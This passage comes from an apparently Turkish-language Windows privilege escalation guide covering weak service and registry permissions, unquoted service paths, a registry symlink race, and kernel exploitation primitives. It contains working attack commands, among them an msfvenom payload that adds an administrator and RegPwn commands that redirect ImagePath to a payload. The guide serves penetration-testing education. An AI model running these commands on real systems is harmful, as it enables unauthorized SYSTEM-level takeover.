Bu güvenlik açığını tespit etmek ve kullanmak için _exploit/windows/local/service_permissions_ kullanılabilir.

### Hizmet ikililerinde zayıf izinler

Bir hizmet **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa; ancak **düşük ayrıcalıklı kullanıcılar hizmet EXE dosyasını veya üst klasörünü değiştirebiliyorsa**, hizmet çoğu zaman **ikili dosya değiştirilip hizmet yeniden başlatılarak** ele geçirilebilir.

Bir hizmet tarafından çalıştırılan ikili dosyayı değiştirip değiştiremeyeceğinizi veya ikili dosyanın bulunduğu klasörde **yazma izniniz** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**)\
Bir hizmet tarafından çalıştırılan tüm ikili dosyaları **wmic** kullanarak (system32 içinde değil) listeleyebilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL’leri, özellikle hizmet executable’ı veya onu içeren dizin üzerinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini kontrol edin. Uygulanabilir bir kötüye kullanım akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve executable yolunu doğrulayın.
2. `icacls <path>` ile binary’nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary’sini bir payload veya geçerli bir kötü amaçlı hizmet binary’siyle değiştirin.
4. Hizmeti `sc stop <service_name> && sc start <service_name>` ile yeniden başlatın (veya yeniden başlatma / hizmet tetikleyicisini bekleyin).

Faydalı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, sistem açılışında otomatik başlayıp başlamadığını, hata durumunda yeniden başlatma eylemi olup olmadığını veya kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Services registry modify permissions

Herhangi bir hizmet registry’sini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **registry’si** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir service key üzerinde **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun yazma yetkisi veren registry izinlerine sahip olup olmadığını kontrol edin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry key hakları, service nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` haklarından ayrıdır. Yetki yükseltme için ayrıca kullanılabilir bir service yapılandırma alanı, service'i tetiklemenin bir yolu ve daha ayrıcalıklı bir service kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) belgelerine bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Registry **symbolic link race**, bu ayrıcalıklı yazmayı **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değer yazma** imkânı sağlayabilir.<sup>[[18]](#references)</sup>

Önemli konumlar (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde bir **oplock** kurarak **race’i kazanın**; oplock tetiklendiğinde, **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefine yönlendiren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değer yazma imkânı elde ettikten sonra, service yapılandırma değerlerini üzerine yazarak LPE’ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir service seçin (ör. **`msiserver`**) ve yazma işleminden sonra onu tetikleyin. **Not:** Genel kullanıma açık exploit uygulaması, race’in bir parçası olarak **iş istasyonunu kilitler**.

Örnek araçlar (RegPwn BOF / bağımsız):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services kayıt defteri AppendData/AddSubdirectory izinleri

Bir kayıt defteri anahtarı üzerinde bu izne sahip olmanız, **bu anahtarın altında alt kayıt defteri anahtarları oluşturabileceğiniz** anlamına gelir. Windows hizmetleri söz konusu olduğunda bu, **rastgele kod çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir yürütülebilir dosyanın yolu tırnak içine alınmamışsa Windows, boşluktan önceki her olası bitişi yürütmeye çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları yürütmeye çalışır:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu zafiyeti** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla bilgi için [resmî belgelere](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görevde, `cmd.exe` ile birlikte **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi yorumlayıcılara açıkça verilen dosya bağımsız değişkenleri için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan `-File` ile PowerShell çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenlerin, koşullu ifadelerin ve shell zincirlemesinin izini elle sürmek gerekir. Çağıranın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev ilkesi çağırandan farklıysa ve görev ilgili eyleme gerçekten ulaşıyorsa hesaplar arası çalıştırma için ipucu oluşturur. Ekleme izni veren bir ACL betikler için önemli olabilir; ancak önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına yol açabilir. Privilege escalation iddiasında bulunmadan önce etkin ACL'leri, [görev çalıştırma bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, normal dizin listelemesinde görünmeyen içeriğe sahip adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedek veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bu bilgilere [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutu aracılığıyla erişim sağlar. Gizli bilgiye işaret eden bir akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin hangi hesapla gerçekten kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Bu yardımcı programı ayrıcalıklı bir hesapla başlatan zamanlanmış bir görev veya hizmet, yardımcı programın çalıştırılabilir dosyası korumalı olsa bile, bu girdilere düşük ayrıcalıklı yazma erişimini o hesabın bağlamında komut çalıştırmaya dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** yan dosyanın oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ayarını ve iki yan dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, çalıştırılabilir dosyanın dizini doğrulanması gereken bir ipucudur; görevin girdilerini nereden okuduğunun kanıtı değildir. Projenin çalışma dosyasına ilişkin ön koşul da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev ilkesini kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (birini üzerine yazıp ayrıcalıkları yükseltebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` konumuna yazan ve değiştirme başarısız olduğunda önceden var olan, yazma korumalı bir dosyayı çalıştıran eski Checkmk Windows agent'larını etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü sürümün tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; yalnızca `2.1` gibi bir dal etiketi, etkilenme durumunu belirlemek için yeterli değildir. Envanter çalışması, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), 6210 ve önceki ADSelfService Plus sürümlerini etkiledi; üretici sorunu 6211 sürümünde düzeltti. Bu sorun yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önemlidir. Bu nedenle, yüklü ürün kaydı veya hizmet yolu bir ipucudur, güvenlik açığı hükmü değildir: tam sürümü, SAML yapılandırma geçmişini, hizmetin ağdan erişilebilirliğini ve çalıştığı hesabı doğrulayın. Hizmet üzerinden kod yürütülmesi, o hesabın ayrıcalıklarını devralır; SYSTEM olarak yürütme için örneğin SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` dosyası, ayrı bir şifreli yedekleme ipucudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin envanter sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller'da iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir; ancak etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Yürütme, controller'ın veya seçilen agent'ın kimliğiyle gerçekleşir; kayıtlı bir kimlik bilgisi yalnızca işin erişebildiği kapsamda kullanılabilir. Ayrıca `JENKINS_HOME` meta verilerine erişimi inceleyin: Jenkins kimlik bilgisi materyallerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların bulunması tek başına bir parolayı açığa çıkarmaz; gerekli dosyalara **okuma erişimini** ve ayrı bir hesap yeniden kullanım yolunu doğrulayın; paylaşılan çıktılara gizli bilgileri yazdırmayın. Bu hesabın bir AD kullanıcı nesnesinde `scriptPath` yazma hakkı varsa, bunu kullanıcılar arası yürütme olarak değerlendirmeden önce yazılabilir bir script yolunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış tüketiciyi doğrulayın. Daha fazla grup denetimi için etkin AD haklarının ayrıca doğrulanması gerekir.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini pipeline'ı **kuyruğa alma** ve seçilen agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Düşük ayrıcalıklı bir hesap bir script adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabı](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) olarak yürütülür. Kullanıcılar arası veya SYSTEM geçişi olduğunu iddia etmeden önce ilgili pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir işi ve agent hizmetinin kimliğini doğrulayın. Yüklü bir agent, proje rolü veya depoya yazma izni tek başına yalnızca bir ipucudur; pasif envanter sırasında build başlatmadan izinleri ve yerel hizmet meta verilerini inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabını**, dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabından** ayrı tutar. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya tek başına veritabanını görebilmek, çözülebilir bir kimlik bilgisini ya da domain ayrıcalık yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL yerleşimini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter yalnızca hizmet ve erişim meta verilerini göstermeli, saklanan gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Yazıcı sürücüsü destek DLL izinleri

Yüklü bir yazıcı sürücüsü, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir yazdırma işleminde yükleyebilir. Yazıcı WMI envanterine erişim reddedilse bile üst dizinler ve reparse point'ler dahil, sürücü dizininin ve DLL ACL'lerinin tam hâlini inceleyin. [Ricoh yazıcı sürücüsü sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) `PrintIsolationHost.exe` tarafından DLL yüklenmesini açıklıyor. Yazılabilir bir ACL yalnızca bir ipucudur: deny girdilerinden sonra etkin yazma erişimini, ilgili sürücünün yüklü olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncellenmiş sürücüsünün veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adına veya sürücü sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Write Permissions

Bir yapılandırma dosyasını değiştirerek özel bir dosyayı okuyup okuyamayacağınızı veya bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod yürütülmesini sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından yürütülecek bir registry girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilginç autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf, şüpheli/açık barındıran** sürücüleri araştırın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler’larında yaygındır), kernel belleğinden doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Windows kernel exploitation ile ilgili materyaller:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager yolunu açtığı race-condition hatalarında, aramanın kasıtlı olarak yavaşlatılması (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool bilgi ifşaları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ını leak eden bir **lock-release-before-copy** bilgi ifşası.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Free-under-lock + cancel afterwards**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine iletebilir.
- Serbest bırakılan queue nesnesini aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation'ıyla **yeniden tahsis edin**. `NPFS` Data Queue Entries kullanışlıdır; payload ve boyut kontrol edilebilir ve sonrasında pipe read/peek işlemleriyle bunlar yoklanabilir. Serbest bırakılan nesne list link'leri içeriyorsa, driver'ın özgün liste başlığında sonlanması yerine saldırgan tanımlı request yapılarını tekrar tekrar işlemesi için bunları **user memory'deki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın.
- **Öngörülebilir bir write'ı yükseltin**: sahte request, bookkeeping write'larında kullanılan iç içe bir context pointer'ını (timestamp / QPC / refcount'a bitişik alanlar) başka yere yönlendiriyorsa, **adres kontrollü ama değer kontrollü olmayan** bir kernel write elde edebilirsiniz. Bu durumda son bir code/data pointer'ı yerine spray edilen bir pool nesnesinin **length/size** alanını hedefleyin, ardından bozulmuş nesne out-of-bounds paged-pool read sağlamaya başlayana kadar spray'i tarayın.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan tüm syscall'lar güçlü adaylardır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın son allocation boyutunu artıran çok sayıda liste/resource girdisi ekleyerek), makinenin çökmesine gerek kalmadan daha uzun bir kopyalama işlemi replacement window'ı genişleteceğinden güvenilirlik artar.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından kontrol edilebildiğinden (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer'ı olduğundan mükemmel bilgi ifşası hedefleridir. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i kurtarın, ardından sonraki I/O ring işlemlerinin saldırgan tarafından oluşturulmuş girdileri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilen tek write size sabit bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` değerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **örtüşen hizasız write'lar** kullanın, bunu `VirtualAlloc` ile map edin ve sahte registered-buffer array'ini oraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once you obtain arbitrary kernel read/write from the corrupted I/O ring, standart post-primitive iş akışını kullanarak bir SYSTEM token'ı çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

Modern hive güvenlik açıkları, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve metadata bozulmasını özel bir driver olmadan kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tüm zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan denetimindeki yollardan kaynaklanan `RtlQueryRegistryValues` doğrudan mod türü karışıklığı

Bazı driver'lar userland'den bir registry yolu kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'a `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa, `EntryContext` geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı denetimindeki mutlak bir `\Registry\...` yolu, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar aracılığıyla varlıklarını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel bellek bozulması**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak tür karışıklığına uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullandığında **untrusted hive**'a erişirse, kernel çağıranlar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` hatasıyla çöker. Exploit edilebilirliği korumak için, değerleri `HKCU` altında hazırlamak yerine **trusted system hive'lar içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive hazırlığı**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox bağlamlarından erişilebilen anahtarları bulmak üzere taramayı çoğaltılmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte’lık bir `int` değişkenine doğrudan 8 byte yazılması, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer’ı kısmen üzerine yazabilir.
